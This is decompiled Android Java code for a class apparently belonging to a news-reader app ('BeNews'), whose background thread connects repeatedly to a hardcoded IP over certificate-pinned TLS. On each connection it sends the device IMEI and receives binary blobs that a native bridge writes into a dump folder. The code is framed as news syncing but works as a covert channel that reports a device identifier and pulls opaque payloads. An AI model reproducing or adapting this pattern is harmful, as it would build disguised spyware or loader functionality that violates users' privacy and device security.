package org.benews;

import android.app.Activity;
import android.content.res.AssetManager;
import android.os.AsyncTask;
import android.util.Log;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.security.KeyManagementException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.Certificate;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import javax.net.SocketFactory;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLPeerUnverifiedException;
import javax.net.ssl.SSLSession;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManagerFactory;
/* loaded from: classes.dex */
public class BackgroundSocket extends Activity implements Runnable {
    public static final String READY = "upAndRunning";
    private static final String TAG = "BackgroundSocket";
    private static final String serialFile = ".news";
    private static final String serialFileTs = ".ts";
    static BackgroundSocket singleton;
    AssetManager assets;
    private Thread coreThread;
    private ArrayList<HashMap<String, String>> list;
    private File serializeFolder;
    private PullIntentService serviceMain;
    private Socket socket;
    private static boolean serviceRunning = false;
    static int news_n = 0;
    private static SocketAsyncTask runningTask = null;
    private boolean run = false;
    private BeNews main = null;
    private long last_timestamp = 0;
    private String dumpFolder = null;
    private String imei = null;
    HashMap<String, String> args_for_bkg = new HashMap<>();
    private boolean noData = false;
    private SocketFactory sf = null;
    ArrayList<NewsUpdateListener> listeners = new ArrayList<>();

    /* loaded from: classes.dex */
    public interface NewsUpdateListener {
        void onNewsUpdate();
    }

    public void setAssets(AssetManager assets) {
        this.assets = assets;
    }

    public void setOnNewsUpdateListener(NewsUpdateListener listener) {
        this.listeners.add(listener);
    }

    public boolean isThreadStarted() {
        return this.coreThread != null && this.coreThread.isAlive();
    }

    public String getSerialFile() {
        return this.serializeFolder.getAbsolutePath() + "/" + serialFile;
    }

    public String getSerialFileTs() {
        return this.serializeFolder.getAbsolutePath() + "/" + serialFileTs;
    }

    private void Core() {
    }

    public synchronized void reset_news() {
        this.last_timestamp = 0L;
        this.list.clear();
        try {
            serialise();
        } catch (Exception e) {
            Log.d(TAG, " (setStop):" + e);
        }
        updateListeners();
        Sleep(1);
        Log.d(TAG, " (reset_news):Done");
        this.noData = false;
        this.args_for_bkg.put(BeNewsArrayAdapter.HASH_FIELD_DATE, "0");
    }

    public synchronized void serialise_list() throws IOException {
        FileOutputStream fos = new FileOutputStream(getSerialFile());
        new ObjectOutputStream(fos);
        if (!this.list.isEmpty()) {
            FileOutputStream fos2 = new FileOutputStream(getSerialFile());
            ObjectOutputStream os = new ObjectOutputStream(fos2);
            os.writeObject(this.list);
            os.close();
        }
    }

    public synchronized void serialise_ts() throws IOException {
        FileOutputStream fos = new FileOutputStream(getSerialFileTs());
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(new Long(this.last_timestamp));
        os.close();
    }

    public synchronized void serialise() throws IOException {
        serialise_list();
        serialise_ts();
    }

    public void setRun(boolean run) {
        if (!run && this.socket != null) {
            new Thread(new Runnable() { // from class: org.benews.BackgroundSocket.1
                @Override // java.lang.Runnable
                public void run() {
                    try {
                        BackgroundSocket.this.socket.close();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
        this.run = run;
    }

    public static synchronized BackgroundSocket self() {
        BackgroundSocket backgroundSocket;
        synchronized (BackgroundSocket.class) {
            if (singleton == null) {
                singleton = new BackgroundSocket();
            }
            backgroundSocket = singleton;
        }
        return backgroundSocket;
    }

    @Override // java.lang.Runnable
    public void run() {
        this.args_for_bkg.put(BeNewsArrayAdapter.HASH_FIELD_DATE, "0");
        this.args_for_bkg.put(BeNewsArrayAdapter.HASH_FIELD_CHECKSUM, "0");
        getList();
        updateListeners();
        while (true) {
            runUntilStop(this.args_for_bkg);
            Sleep(2);
        }
    }

    private boolean runUntilStop(HashMap<String, String> args) {
        while (this.run) {
            try {
                if (args.containsKey(BeNewsArrayAdapter.HASH_FIELD_DATE)) {
                    Long.parseLong(args.get(BeNewsArrayAdapter.HASH_FIELD_DATE));
                }
            } catch (Exception e) {
            }
            if (runningTask == null || !runningTask.isRunning()) {
                runningTask = new SocketAsyncTask(args);
                runningTask.execute(args);
            }
            if (runningTask != null && runningTask.isRunning() && ((0 != 0 && 0 == runningTask.getLast_timestamp() && !runningTask.isConnectionError()) || runningTask.noData())) {
                Log.d(TAG, " (runUntilStop): No new news waiting ...");
                Sleep(60);
            }
            Sleep(1);
        }
        return false;
    }

    public synchronized void saveStauts() {
        try {
            serialise_list();
        } catch (Exception e) {
            Log.d(TAG, " (saveStauts):" + e);
        }
    }

    public static void Sleep(int i) {
        try {
            Thread.sleep(i * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static BackgroundSocket newCore(PullIntentService serviceMain) {
        if (singleton == null) {
            singleton = new BackgroundSocket();
        }
        singleton.serviceMain = serviceMain;
        return singleton;
    }

    public boolean Start() {
        if (serviceRunning) {
            return false;
        }
        this.coreThread = new Thread(this);
        try {
            setRun(true);
            this.coreThread.start();
        } catch (Exception e) {
        }
        serviceRunning = true;
        return true;
    }

    public void setDumpFolder(String dumpFolder) {
        this.dumpFolder = new String(dumpFolder);
    }

    public String getDumpFolder() {
        return this.dumpFolder;
    }

    public void setImei(String imei) {
        this.imei = new String(imei);
    }

    public String getImei() {
        return this.imei;
    }

    public synchronized ArrayList<HashMap<String, String>> getList() {
        if (this.list == null && new File(getSerialFile()).exists()) {
            try {
                FileInputStream fis = new FileInputStream(getSerialFile());
                ObjectInputStream is = new ObjectInputStream(fis);
                this.list = (ArrayList) is.readObject();
                is.close();
            } catch (Exception e) {
                Log.d(TAG, " (getList):" + e);
                e.printStackTrace();
            }
        }
        if (this.list == null) {
            Log.d(TAG, " (getList) initializing list");
            this.list = new ArrayList<>();
        }
        if (new File(getSerialFileTs()).exists()) {
            try {
                FileInputStream fis2 = new FileInputStream(getSerialFileTs());
                ObjectInputStream is2 = new ObjectInputStream(fis2);
                this.last_timestamp = ((Long) is2.readObject()).longValue();
                is2.close();
            } catch (Exception e2) {
                Log.d(TAG, " (getList Ts):" + e2);
                e2.printStackTrace();
            }
        }
        return this.list;
    }

    public boolean isRunning() {
        if (runningTask == null) {
            return false;
        }
        return runningTask.isRunning();
    }

    public void setSerializeFolder(File filesDir) {
        this.serializeFolder = filesDir;
    }

    public void updateListeners() {
        Iterator i$ = this.listeners.iterator();
        while (i$.hasNext()) {
            NewsUpdateListener listener = i$.next();
            listener.onNewsUpdate();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* loaded from: classes.dex */
    public class SocketAsyncTask extends AsyncTask<HashMap<String, String>, Void, ByteBuffer> {
        private final HashMap<String, String> args;
        private boolean connectionError;
        private boolean running;

        public boolean isConnectionError() {
            return this.connectionError;
        }

        public boolean noData() {
            return BackgroundSocket.this.noData;
        }

        private SocketAsyncTask(HashMap<String, String> args) {
            this.running = false;
            this.connectionError = false;
            this.args = args;
        }

        @Override // android.os.AsyncTask
        protected void onPreExecute() {
            this.running = true;
            super.onPreExecute();
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        public ByteBuffer doInBackground(HashMap<String, String>... args) {
            ByteBuffer wrapped = null;
            try {
                this.connectionError = false;
                String cks = "0";
                if (args.length > 0 && args[0].containsKey(BeNewsArrayAdapter.HASH_FIELD_CHECKSUM)) {
                    cks = args[0].get(BeNewsArrayAdapter.HASH_FIELD_CHECKSUM);
                }
                byte[] obj = BsonBridge.getTokenBson(BackgroundSocket.this.imei, BackgroundSocket.this.last_timestamp, cks);
                if (BackgroundSocket.this.sf == null) {
                    BackgroundSocket.this.sf = getSocketFactory();
                }
                BackgroundSocket.this.socket = createSSLSocket(BackgroundSocket.this.sf);
                InputStream is = BackgroundSocket.this.socket.getInputStream();
                BufferedOutputStream out = new BufferedOutputStream(BackgroundSocket.this.socket.getOutputStream());
                out.write(obj);
                out.flush();
                System.gc();
                byte[] size = new byte[4];
                int read = is.read(size);
                if (read > 0) {
                    ByteBuffer wrapped2 = ByteBuffer.wrap(size);
                    wrapped2.order(ByteOrder.LITTLE_ENDIAN);
                    int s = wrapped2.getInt();
                    byte[] buffer = new byte[s - 4];
                    wrapped = ByteBuffer.allocateDirect(s);
                    wrapped.order(ByteOrder.LITTLE_ENDIAN);
                    wrapped.put(size, 0, size.length);
                    while (s - read > 0) {
                        publishProgress(read);
                        int res = is.read(buffer);
                        if (res <= 0) {
                            break;
                        }
                        wrapped.put(buffer, 0, res);
                        read += res;
                    }
                }
                is.close();
                out.close();
                BackgroundSocket.this.socket.close();
            } catch (Exception e) {
                Log.d(BackgroundSocket.TAG, "Exception :" + e);
                this.connectionError = true;
                this.running = false;
            } finally {
                System.gc();
            }
            return wrapped;
        }

        private SocketFactory getSocketFactory() throws CertificateException, IOException, KeyStoreException, NoSuchAlgorithmException, KeyManagementException {
            CertificateFactory cf = CertificateFactory.getInstance("X.509");
            InputStream caInput = BackgroundSocket.this.assets.open("server.crt");
            try {
                Certificate ca = cf.generateCertificate(caInput);
                System.out.println("ca=" + ((X509Certificate) ca).getSubjectDN());
                caInput.close();
                String keyStoreType = KeyStore.getDefaultType();
                KeyStore keyStore = KeyStore.getInstance(keyStoreType);
                keyStore.load(null, null);
                keyStore.setCertificateEntry("ca", ca);
                String tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();
                TrustManagerFactory tmf = TrustManagerFactory.getInstance(tmfAlgorithm);
                tmf.init(keyStore);
                SSLContext context = SSLContext.getInstance("TLS");
                context.init(null, tmf.getTrustManagers(), null);
                return context.getSocketFactory();
            } catch (Throwable th) {
                caInput.close();
                throw th;
            }
        }

        private Socket createSSLSocket(SocketFactory sf) throws CertificateException, IOException, KeyStoreException, NoSuchAlgorithmException, KeyManagementException {
            SSLSocket socket = (SSLSocket) sf.createSocket("46.38.48.178", 443);
            HttpsURLConnection.getDefaultHostnameVerifier();
            socket.startHandshake();
            printServerCertificate(socket);
            printSocketInfo(socket);
            return socket;
        }

        private void printServerCertificate(SSLSocket socket) {
            try {
                Certificate[] serverCerts = socket.getSession().getPeerCertificates();
                for (int i = 0; i < serverCerts.length; i++) {
                    Certificate myCert = serverCerts[i];
                    Log.i(BackgroundSocket.TAG, "====Certificate:" + (i + 1) + "====");
                    Log.i(BackgroundSocket.TAG, "-Public Key-\n" + myCert.getPublicKey());
                    Log.i(BackgroundSocket.TAG, "-Certificate Type-\n " + myCert.getType());
                    System.out.println();
                }
            } catch (SSLPeerUnverifiedException e) {
                Log.i(BackgroundSocket.TAG, "Could not verify peer");
                e.printStackTrace();
                System.exit(-1);
            }
        }

        private void printSocketInfo(SSLSocket s) {
            Log.i(BackgroundSocket.TAG, "Socket class: " + s.getClass());
            Log.i(BackgroundSocket.TAG, "   Remote address = " + s.getInetAddress().toString());
            Log.i(BackgroundSocket.TAG, "   Remote port = " + s.getPort());
            Log.i(BackgroundSocket.TAG, "   Local socket address = " + s.getLocalSocketAddress().toString());
            Log.i(BackgroundSocket.TAG, "   Local address = " + s.getLocalAddress().toString());
            Log.i(BackgroundSocket.TAG, "   Local port = " + s.getLocalPort());
            Log.i(BackgroundSocket.TAG, "   Need client authentication = " + s.getNeedClientAuth());
            SSLSession ss = s.getSession();
            Log.i(BackgroundSocket.TAG, "   Cipher suite = " + ss.getCipherSuite());
            Log.i(BackgroundSocket.TAG, "   Protocol = " + ss.getProtocol());
        }

        public boolean isRunning() {
            return this.running;
        }

        public long getLast_timestamp() {
            return BackgroundSocket.this.last_timestamp;
        }

        private void publishProgress(int read) {
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        public void onPostExecute(ByteBuffer result) {
            synchronized (this) {
                if (result != null) {
                    if (result.capacity() > 0) {
                        HashMap<String, String> ret = BsonBridge.serializeBson(BackgroundSocket.this.getDumpFolder(), result);
                        if (ret != null && ret.size() > 0) {
                            if (ret.containsKey(BeNewsArrayAdapter.HASH_FIELD_DATE)) {
                                this.args.put(BeNewsArrayAdapter.HASH_FIELD_DATE, ret.get(BeNewsArrayAdapter.HASH_FIELD_DATE));
                                BackgroundSocket.this.last_timestamp = Long.parseLong(ret.get(BeNewsArrayAdapter.HASH_FIELD_DATE));
                                try {
                                    BackgroundSocket.this.serialise_ts();
                                } catch (Exception e) {
                                    Log.d(BackgroundSocket.TAG, " (onPostExecute): failed to serialize ts ");
                                }
                            }
                            if (ret.containsKey(BeNewsArrayAdapter.HASH_FIELD_CHECKSUM)) {
                                this.args.put(BeNewsArrayAdapter.HASH_FIELD_CHECKSUM, ret.get(BeNewsArrayAdapter.HASH_FIELD_CHECKSUM));
                                String cks = ret.get(BeNewsArrayAdapter.HASH_FIELD_CHECKSUM);
                                if (cks.contentEquals("0") && ret.containsKey(BeNewsArrayAdapter.HASH_FIELD_PATH)) {
                                    BackgroundSocket.this.list.add(ret);
                                    BackgroundSocket.this.saveStauts();
                                    BackgroundSocket.this.updateListeners();
                                    try {
                                        if (ret.containsKey(BeNewsArrayAdapter.HASH_FIELD_DATE)) {
                                            this.args.put(BeNewsArrayAdapter.HASH_FIELD_DATE, ret.get(BeNewsArrayAdapter.HASH_FIELD_DATE));
                                            this.args.put("ok", "0");
                                        }
                                    } catch (Exception e2) {
                                        Log.d(BackgroundSocket.TAG, " (onPostExecute): failed to parse " + BackgroundSocket.this.last_timestamp);
                                    }
                                    BackgroundSocket.news_n++;
                                }
                            }
                        }
                        BackgroundSocket.this.noData = false;
                        System.gc();
                        this.running = false;
                    }
                }
                BackgroundSocket.this.noData = true;
                this.running = false;
            }
        }
    }
}
